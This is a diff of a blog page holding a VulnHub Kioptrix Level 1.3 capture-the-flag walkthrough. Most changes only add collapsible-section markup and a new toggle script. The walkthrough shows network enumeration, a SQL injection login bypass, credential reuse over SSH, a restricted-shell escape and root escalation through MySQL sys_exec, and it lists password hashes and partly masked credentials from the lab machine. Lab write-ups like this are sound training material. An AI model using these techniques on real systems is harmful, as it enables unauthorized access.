@@ -31,19 +31,19 @@
       </table>
     </div>
     <div class="body">
-          <h1>[VulnHub] Kioptrix: Level 1.3 (#4)</h1>
+          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Kioptrix: Level 1.3 (#4)</h1>
                   <p><a href="/posts/20190929_vulnhub-kioptrix3.html"> « </a>📅 published on <code>08/Oct/2019</code><a href="/posts/20191009_vulnhub-kioptrix5.html"> » </a></p>
-                <h2>Overview</h2>
-<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
-<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix4/machinescli.png.webp" /></p>
-<h3>Killchain</h3>
-<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
-<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix4/killchain.png.webp" /></p>
-<h3>TTPs</h3>
-<p>1. <code>80/tcp/http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_sqli">exploit_sqli</a>, <a href="https://github.com/7h3rAm/writeups#exploit_credsreuse">exploit_credsreuse</a>, <a href="https://github.com/7h3rAm/writeups#privesc_shell_escape">privesc_shell_escape</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_root">privesc_mysql_root</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_udf">privesc_mysql_udf</a>  </p>
-<h2>Phase #1: Enumeration</h2>
-<p>1. Here's the Nmap scan result:  </p>
-<pre><code># Nmap 7.70 scan initiated Tue Oct  8 15:47:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/xml/_quick_tcp_nmap.xml 192.168.92.131
+                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix4/machinescli.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
+<p class="nested">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix4/killchain.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
+<p class="nested">1. <code>80/tcp/http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_sqli">exploit_sqli</a>, <a href="https://github.com/7h3rAm/writeups#exploit_credsreuse">exploit_credsreuse</a>, <a href="https://github.com/7h3rAm/writeups#privesc_shell_escape">privesc_shell_escape</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_root">privesc_mysql_root</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_udf">privesc_mysql_udf</a>  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<p class="nested">1. Here's the Nmap scan result:  </p>
+<pre class="nested"><code># Nmap 7.70 scan initiated Tue Oct  8 15:47:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/xml/_quick_tcp_nmap.xml 192.168.92.131
 Nmap scan report for 192.168.92.131
 Host is up, received arp-response (0.0012s latency).
 Scanned at 2019-10-08 15:47:03 PDT for 35s
@@ -105,10 +105,10 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Oct  8 15:47:38 2019 -- 1 IP address (1 host up) scanned in 36.59 seconds
 </code></pre>
-<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
-<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/openports.png.webp" />  </p>
-<p>3. From the SMB scan, we find that there are 3 users (other than <code>root</code>) on the target system:  </p>
-<pre><code>===============================
+<p class="nested">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/openports.png.webp" />  </p>
+<p class="nested">3. From the SMB scan, we find that there are 3 users (other than <code>root</code>) on the target system:  </p>
+<pre class="nested"><code>===============================
 |    Users on 192.168.92.131  |
 ===============================
 index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody Name: nobody  Desc: (null)
@@ -117,38 +117,38 @@ index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root Name: root  Desc: (null)
 index: 0x4 RID: 0xbba acb: 0x00000010 Account: john Name: ,,, Desc: (null)
 index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret Name: loneferret,,, Desc: (null)
 </code></pre>
-<h3>Findings</h3>
-<h4>Open Ports</h4>
-<pre><code>22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
 80/tcp   |  http         |  Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
 137/udp  |  netbios-ns   |  Microsoft Windows netbios-ns (workgroup: WORKGROUP)
 139/tcp  |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  |  netbios-ssn  |  Samba smbd 3.0.28a (workgroup: WORKGROUP)
 </code></pre>
-<h4>Users</h4>
-<pre><code>ssh: root, robert, john, loneferret
+<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
+<pre class="nested"><code>ssh: root, robert, john, loneferret
 </code></pre>
-<h2>Phase #2: Exploitation</h2>
-<p>1. We find a login page at <code>http://192.168.92.131:80/index.php</code> and successfully bypass it via a sqli. Once logged in, the webapp shows the unhashed/cleartext password for user <code>john</code>. We repeat the process to obtain password for user <code>robert</code> as well (<code>loneferret</code> is not registered on this web application):  </p>
-<pre><code>name: john
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<p class="nested">1. We find a login page at <code>http://192.168.92.131:80/index.php</code> and successfully bypass it via a sqli. Once logged in, the webapp shows the unhashed/cleartext password for user <code>john</code>. We repeat the process to obtain password for user <code>robert</code> as well (<code>loneferret</code> is not registered on this web application):  </p>
+<pre class="nested"><code>name: john
 password: ' or 1=1 -- -
 
 name: robert
 password: ' or 1=1 -- -
 </code></pre>
-<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot01.png.webp" />  </p>
-<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix4/screenshot02.png.webp" />  </p>
-<p><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_kioptrix4/screenshot03.png.webp" />  </p>
-<p>2. We successfully ssh as user <code>john</code> since this user has reused their web application credentials:  </p>
-<pre><code>ssh john@192.168.92.131
+<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot01.png.webp" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix4/screenshot02.png.webp" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_kioptrix4/screenshot03.png.webp" />  </p>
+<p class="nested">2. We successfully ssh as user <code>john</code> since this user has reused their web application credentials:  </p>
+<pre class="nested"><code>ssh john@192.168.92.131
 </code></pre>
-<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot04.png.webp" />  </p>
-<p>3. We find ourselves in a restricted <a href="https://github.com/ghantoos/lshell">lshell</a> that severly limits usability. We escape this restricted shell by running the <code>echo</code> command with <code>os.system</code> function:  </p>
-<pre><code>echo os.system('/bin/bash')
+<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot04.png.webp" />  </p>
+<p class="nested">3. We find ourselves in a restricted <a href="https://github.com/ghantoos/lshell">lshell</a> that severly limits usability. We escape this restricted shell by running the <code>echo</code> command with <code>os.system</code> function:  </p>
+<pre class="nested"><code>echo os.system('/bin/bash')
 </code></pre>
-<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot05.png.webp" />  </p>
-<h2>Phase #2.5: Post Exploitation</h2>
-<pre><code>john@Kioptrix4&gt; id
+<p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot05.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<pre class="nested"><code>john@Kioptrix4&gt; id
 uid=1001(john) gid=1001(john) groups=1001(john)
 john@Kioptrix4&gt;  
 john@Kioptrix4&gt; uname
@@ -170,36 +170,36 @@ loneferret
 john
 robert
 </code></pre>
-<h2>Phase #3: Privilege Escalation</h2>
-<p>1. We explore the web directory and find <code>mysql</code> credentials for user <code>root</code>:  </p>
-<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot06.png.webp" />  </p>
-<p>2. We explore running processes and find that <code>mysql</code> is executing with elevated privileges (pid: 4638). We search for the required <code>mysql</code> shared object file and find it at <code>/usr/lib/lib_mysqludf_sys.so</code>. This means we can run custom commands from within <code>mysql</code> shell as user <code>root</code>:  </p>
-<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot07.png.webp" />  </p>
-<p>3. We connect to <code>mysql</code> as user <code>root</code> and execute a command to add user <code>john</code> to the <code>admin</code> group:  </p>
-<pre><code>mysql -h localhost -u root -p
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<p class="nested">1. We explore the web directory and find <code>mysql</code> credentials for user <code>root</code>:  </p>
+<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot06.png.webp" />  </p>
+<p class="nested">2. We explore running processes and find that <code>mysql</code> is executing with elevated privileges (pid: 4638). We search for the required <code>mysql</code> shared object file and find it at <code>/usr/lib/lib_mysqludf_sys.so</code>. This means we can run custom commands from within <code>mysql</code> shell as user <code>root</code>:  </p>
+<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot07.png.webp" />  </p>
+<p class="nested">3. We connect to <code>mysql</code> as user <code>root</code> and execute a command to add user <code>john</code> to the <code>admin</code> group:  </p>
+<pre class="nested"><code>mysql -h localhost -u root -p
   select sys_exec(&quot;usermod -a -G admin john&quot;);
   exit
 </code></pre>
-<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot08.png.webp" />  </p>
-<p>4. Now we can change to user <code>root</code> and complete the challenge:  </p>
-<pre><code>sudo su
+<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot08.png.webp" />  </p>
+<p class="nested">4. Now we can change to user <code>root</code> and complete the challenge:  </p>
+<pre class="nested"><code>sudo su
 cat /root/congrats.txt
 </code></pre>
-<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot09.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_kioptrix4/screenshot10.png.webp" />  </p>
-<h2>Loot</h2>
-<h3>Hashes</h3>
-<pre><code>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:............
+<p class="nested"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot09.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_kioptrix4/screenshot10.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
+<pre class="nested"><code>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:............
 loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375.............
 john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:............
 robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:............
 </code></pre>
-<h3>Credentials</h3>
-<pre><code>liggoat: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
+<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
+<pre class="nested"><code>liggoat: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
 ssh: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
 </code></pre>
-<h2>References</h2>
-<ul>
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">https://www.vulnhub.com/entry/kioptrix-level-13-4,25/</a>  </li>
 <li><a href="https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub.html">https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub.html</a>  </li>
 <li><a href="http://www.gcura.tech/kioptrix-level-1-3-4/">http://www.gcura.tech/kioptrix-level-1-3-4/</a>  </li>
@@ -211,19 +211,12 @@ ssh: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
             </div>
     <div class="footer footercenter">
       <span>
-        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
       </span>
     </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(s){
-        s.classList.toggle("expanded");
-        for(var l=s.nextElementSibling;l;){
-          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-        }
-      }
-    </script>
+    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
     <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
   </body>
 </html>
